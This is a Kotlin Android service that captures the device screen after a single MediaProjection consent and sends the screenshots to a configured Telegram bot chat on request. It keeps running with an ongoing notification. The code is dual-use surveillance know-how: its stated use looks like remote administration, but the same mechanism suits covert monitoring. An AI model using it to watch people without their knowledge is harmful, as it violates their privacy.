package com.rtk.telegrammanager.screen

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.core.content.FileProvider
import com.rtk.telegrammanager.R
import com.rtk.telegrammanager.security.SecureStorage
import com.rtk.telegrammanager.telegram.TelegramApi
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import java.io.File
import java.util.concurrent.atomic.AtomicBoolean

class ScreenCaptureService : Service() {

    private val serviceScope =
        CoroutineScope(SupervisorJob() + Dispatchers.IO)

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null

    private var captureWidth = 0
    private var captureHeight = 0
    private var captureDensity = 0

    private lateinit var workerThread: HandlerThread
    private lateinit var workerHandler: Handler

    private val captureRequested = AtomicBoolean(false)
    private val captureRunning = AtomicBoolean(false)

    override fun onCreate() {
        super.onCreate()

        workerThread = HandlerThread("RTK-ScreenCapture").apply {
            start()
        }

        workerHandler = Handler(workerThread.looper)

        createNotificationChannel()

        val notification = buildNotification()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            )
        } else {
            startForeground(
                NOTIFICATION_ID,
                notification
            )
        }
    }

    override fun onStartCommand(
        intent: Intent?,
        flags: Int,
        startId: Int
    ): Int {

        when (intent?.action) {

            ACTION_START_PROJECTION -> {
                val resultCode =
                    intent.getIntExtra(
                        EXTRA_RESULT_CODE,
                        RESULT_CANCELED
                    )

                val data =
                    if (Build.VERSION.SDK_INT >= 33) {
                        intent.getParcelableExtra(
                            EXTRA_RESULT_DATA,
                            Intent::class.java
                        )
                    } else {
                        @Suppress("DEPRECATION")
                        intent.getParcelableExtra(EXTRA_RESULT_DATA)
                    }

                if (
                    resultCode == RESULT_OK &&
                    data != null
                ) {
                    startProjection(
                        resultCode,
                        data
                    )
                }
            }

            ACTION_CAPTURE -> {
                requestCapture()
            }

            ACTION_STOP -> {
                stopProjection()
                stopSelf()
            }
        }

        return START_STICKY
    }

    private fun startProjection(
        resultCode: Int,
        data: Intent
    ) {
        try {
            stopProjection()

            val projectionManager =
                getSystemService(
                    Context.MEDIA_PROJECTION_SERVICE
                ) as MediaProjectionManager

            val projection =
                projectionManager.getMediaProjection(
                    resultCode,
                    data
                ) ?: return

            mediaProjection = projection
            activeProjection = projection

            projection.registerCallback(
                object : MediaProjection.Callback() {
                    override fun onStop() {
                        captureRequested.set(false)
                        captureRunning.set(false)

                        virtualDisplay?.release()
                        virtualDisplay = null

                        imageReader?.close()
                        imageReader = null

                        mediaProjection = null
                    activeProjection = null
                    }
                },
                workerHandler
            )

            val metrics = resources.displayMetrics

            captureWidth = metrics.widthPixels
            captureHeight = metrics.heightPixels
            captureDensity = metrics.densityDpi

            if (captureWidth <= 0 || captureHeight <= 0) {
                stopProjection()
                return
            }

            val reader =
                ImageReader.newInstance(
                    captureWidth,
                    captureHeight,
                    PixelFormat.RGBA_8888,
                    3
                )

            imageReader = reader

            reader.setOnImageAvailableListener(
                { source ->
                    if (!captureRequested.get()) {
                        source.acquireLatestImage()?.close()
                        return@setOnImageAvailableListener
                    }

                    if (
                        !captureRunning.compareAndSet(
                            false,
                            true
                        )
                    ) {
                        source.acquireLatestImage()?.close()
                        return@setOnImageAvailableListener
                    }

                    captureRequested.set(false)

                    try {
                        val image =
                            source.acquireLatestImage()

                        if (image == null) {
                            captureRunning.set(false)
                            return@setOnImageAvailableListener
                        }

                        image.use {
                            val plane = it.planes[0]
                            val buffer = plane.buffer
                            val pixelStride = plane.pixelStride
                            val rowStride = plane.rowStride
                            val rowPadding =
                                rowStride -
                                    pixelStride * captureWidth

                            val bitmap =
                                Bitmap.createBitmap(
                                    captureWidth +
                                        rowPadding / pixelStride,
                                    captureHeight,
                                    Bitmap.Config.ARGB_8888
                                )

                            bitmap.copyPixelsFromBuffer(buffer)

                            val cleanBitmap =
                                Bitmap.createBitmap(
                                    bitmap,
                                    0,
                                    0,
                                    captureWidth,
                                    captureHeight
                                )

                            bitmap.recycle()

                            sendScreenshot(
                                cleanBitmap
                            )
                        }

                    } catch (e: Exception) {
                        e.printStackTrace()
                    } finally {
                        captureRunning.set(false)
                    }
                },
                workerHandler
            )

            virtualDisplay =
                projection.createVirtualDisplay(
                    "RTK-ScreenCapture",
                    captureWidth,
                    captureHeight,
                    captureDensity,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    reader.surface,
                    null,
                    workerHandler
                )

        } catch (e: Exception) {
            e.printStackTrace()
            stopProjection()
        }
    }

    private fun requestCapture() {
        if (mediaProjection == null ||
            virtualDisplay == null ||
            imageReader == null
        ) {
            return
        }

        captureRequested.set(true)

        /*
         * The VirtualDisplay continuously feeds ImageReader.
         * If no frame arrives immediately, another frame will satisfy
         * this request without opening another consent dialog.
         */
        workerHandler.postDelayed(
            {
                if (captureRequested.get()) {
                    val reader = imageReader

                    try {
                        reader?.acquireLatestImage()?.close()
                    } catch (_: Exception) {
                    }
                }
            },
            2500L
        )
    }

    private fun sendScreenshot(
        bitmap: Bitmap
    ) {
        serviceScope.launch {

            var photoFile: File? = null

            try {
                val storage =
                    SecureStorage(applicationContext)

                val token =
                    storage.getBotToken()
                        ?: error("Bot token not configured")

                val chatId =
                    storage.getChatId()
                        ?: error("Chat ID not configured")

                photoFile =
                    File(
                        cacheDir,
                        "rtk_screen_${System.currentTimeMillis()}.jpg"
                    )

                photoFile.outputStream().use { output ->
                    if (
                        !bitmap.compress(
                            Bitmap.CompressFormat.JPEG,
                            82,
                            output
                        )
                    ) {
                        error("Failed to encode screenshot")
                    }
                }

                bitmap.recycle()

                val photoUri =
                    FileProvider.getUriForFile(
                        this@ScreenCaptureService,
                        "${packageName}.fileprovider",
                        photoFile
                    )

                val result =
                    TelegramApi().sendPhoto(
                        token = token,
                        chatId = chatId,
                        photoUri = photoUri,
                        contentResolver = contentResolver,
                        caption = "📱 Current Screen"
                    )

                if (result.isFailure) {
                    result.exceptionOrNull()?.printStackTrace()
                }

            } catch (e: Exception) {
                e.printStackTrace()
            } finally {
                photoFile?.delete()
            }
        }
    }

    private fun stopProjection() {
        captureRequested.set(false)
        captureRunning.set(false)

        try {
            virtualDisplay?.release()
        } catch (_: Exception) {
        }

        virtualDisplay = null

        try {
            imageReader?.close()
        } catch (_: Exception) {
        }

        imageReader = null

        try {
            mediaProjection?.stop()
        } catch (_: Exception) {
        }

        mediaProjection = null
        activeProjection = null
    }

    private fun createNotificationChannel() {
        val manager =
            getSystemService(
                Context.NOTIFICATION_SERVICE
            ) as NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            manager.createNotificationChannel(
                NotificationChannel(
                    CHANNEL_ID,
                    "RTK Screen Capture",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description =
                        "Active screen capture session"
                }
            )
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(
            this,
            CHANNEL_ID
        )
            .setSmallIcon(
                android.R.drawable.ic_menu_view
            )
            .setContentTitle(
                "RTK Screen Capture"
            )
            .setContentText(
                "Screen capture session is active"
            )
            .setOngoing(true)
            .setCategory(
                NotificationCompat.CATEGORY_SERVICE
            )
            .build()
    }

    override fun onDestroy() {
        stopProjection()

        try {
            workerThread.quitSafely()
        } catch (_: Exception) {
        }

        serviceScope.cancel()

        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    companion object {

        const val ACTION_START_PROJECTION =
            "com.rtk.telegrammanager.screen.START_PROJECTION"

        const val ACTION_CAPTURE =
            "com.rtk.telegrammanager.screen.CAPTURE"

        const val ACTION_STOP =
            "com.rtk.telegrammanager.screen.STOP"

        const val EXTRA_RESULT_CODE =
            "projection_result_code"

        const val EXTRA_RESULT_DATA =
            "projection_result_data"

        private const val CHANNEL_ID =
            "rtk_screen_capture"

        private const val NOTIFICATION_ID =
            2001

        private const val RESULT_OK = -1
        private const val RESULT_CANCELED = 0

        fun isActive(context: Context): Boolean {
            return activeProjection != null
        }

        private var activeProjection: Any? = null

        fun requestCapture(context: Context): Boolean {

            if (activeProjection == null) {
                return false
            }

            return try {
                context.startService(
                    Intent(
                        context,
                        ScreenCaptureService::class.java
                    ).apply {
                        action = ACTION_CAPTURE
                    }
                )

                true
            } catch (e: Exception) {
                e.printStackTrace()
                false
            }
        }
    }
}
